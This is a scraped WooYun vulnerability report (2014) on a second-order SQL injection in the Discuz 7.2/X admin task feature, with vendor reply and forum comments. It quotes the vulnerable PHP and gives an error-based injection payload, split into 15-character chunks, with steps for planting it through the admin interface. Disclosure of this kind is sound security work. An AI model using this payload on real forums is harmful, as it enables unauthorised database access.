{"id": 52707, "wybug_id": "wooyun-2014-070394", "wybug_title": "discuz 7.2&amp;discuz x&lt;=2 后台注入", "wybug_corp": "Discuz!", "wybug_author": "do9gy", "wybug_date": "2014-07-31 17:50", "wybug_open_date": "2014-10-29 17:52", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向公众公开  简要描述： 第二发 详细说明：  以dz7.2来说，漏洞位于task.php 57行，\n$query = $db->query(\"SELECT t.*, mt.csc, mt.dateline FROM {$tablepre}tasks t\t\t\tLEFT JOIN {$tablepre}mytasks mt ON mt.taskid=t.taskid AND mt.uid='$discuz_uid'\t\t\tWHERE $sql AND t.available='2' $newbieadd ORDER BY displayorder, taskid DESC LIMIT $start_limit, $tpp\");\t\twhile($task = $db->fetch_array($query)) {\t\t\tif($task['reward'] == 'magic') {\t\t\t\t$magicids[] = $task['prize'];  //这里\t\t\t} elseif($task['reward'] == 'medal') {\t\t\t\t$medalids[] = $task['prize'];\t\t\t} elseif($task['reward'] == 'group') {\t\t\t\t$groupids[] = $task['prize'];\t\t\t}\n121行，\nif($magicids) {\t\t$query = $db->query(\"SELECT magicid, name FROM {$tablepre}magics WHERE magicid IN (\".implodeids($magicids).\")\");  //这里\t\twhile($magic = $db->fetch_array($query)) {\t\t\t$magics[$magic['magicid']] = $magic['name'];\t\t}\t}\n$magicids 参数从数据库中tasks表，prize 取出，这里可以二次注入。tasks->prize的修改插入权限进对后台管理员开放，所以又一次鸡肋了。但是到了这里还没结束，仔细看一下prize 为char(15)，最多只能存储15个字节，崩溃了。。不过再仔细看一下代码，峰回路转，绝处逢生，柳暗花明。原来，$magicids是从tasks列表中取出的数组，然后又进行implodeids拼接。没错，快使用双截棍哼哼哈嘿！把sql语句拼接一下。。利用已经构造好的代码：1')and(select1 from (select count(*),concat(version(),floor(rand(0)*2))x from mysql.user group by x)a)#按最大长度15分割：1')and(select/**/1 from (/**/select/**/count(*)/**/,concat(/**/version(),/**/floor(/**/rand(0)/**/*2))x from/**/mysql.user/**/group/**/by x)a)#看上去挺不可思议的。测试一下。。。登录后台，添加任务，这里需要注意三点：1. 倒序添加2.选择任务奖励为道具，道具种类需要把select改为input输入以上分割的sql语句（或者抓包改）。3. 最后一个带有单引号的任务先添加不含有引号的，回到管理界面勾选可用提交后再通过详情加入单引号，否则由于页面sql错误导致无法正常编辑。保存好以后前台打开   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 do9gy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-08-01 09:28 厂商回复： 感谢您提出的问题，我们尽快予以处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-31 18:01 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  可惜。。后台注入都不上首页    \n     2014-07-31 18:55 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  可惜，主要是@Map 提交了太多前台。。。    \n     2014-07-31 22:38 |    \t\tdo9gy \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:15        | Dog loves God。)\t\t \n  楼上两位大牛好~    \n     2014-08-02 11:15 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  所有漏洞就会回复尽快，修复你妹啊，一堆漏洞，两个月了还不发补丁，shell全拿完了！    \n     2014-08-04 14:13 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  ～～我又来了    \n     2014-08-05 09:34 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:21        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  @Hmily  果断很多0day 0oo..    \n     2014-08-06 16:32 |    \t\tdo9gy \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:15        | Dog loves God。)\t\t \n  小m，坑总~    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}